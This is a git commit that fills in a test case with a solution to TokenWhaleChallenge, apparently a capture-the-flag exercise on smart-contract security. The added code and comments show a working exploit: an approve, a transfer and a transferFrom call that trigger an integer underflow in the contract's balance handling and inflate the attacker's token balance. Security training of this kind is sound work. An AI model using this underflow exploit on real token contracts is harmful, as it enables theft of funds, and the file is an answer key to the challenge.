c21d6b4e150832080c38cebf5102e7eb78cb8750
ffmcgee <jc.992@hotmail.com>
2024-09-12 09:10:42 +0200

    test: exploit for TokenWhaleChallenge

--- test/11-TokenWhale.test.ts
+++ test/11-TokenWhale.test.ts
@@ -21,9 +21,20 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
+    await target.connect(deployer).approve(attacker.address, 1000);
     /**
-     * YOUR CODE HERE
-     * */
+     * We make sure to leave attacker balance at 499, by transferring 501 tokens to another address
+     */
+    await target.connect(attacker).transfer(deployer.address, 501);
+    /**
+     * And call transferFrom on behalf of this address, with 500 as the amount
+     * This causes an underflow in the `_transfer(address to, uint256 value)` method, due to faulty balance management by the contract
+     * `balanceOf[msg.sender] -= value;` -> `msg.sender` here being the attacker, and not the deployer address, so 499-500 causes an underflow
+     * And attacker address balance shoots up!
+     */
+    await target
+      .connect(attacker)
+      .transferFrom(deployer.address, '0x0000000000000000000000000000000000000000', 500);
 
     expect(await target.isComplete()).to.equal(true);
   });
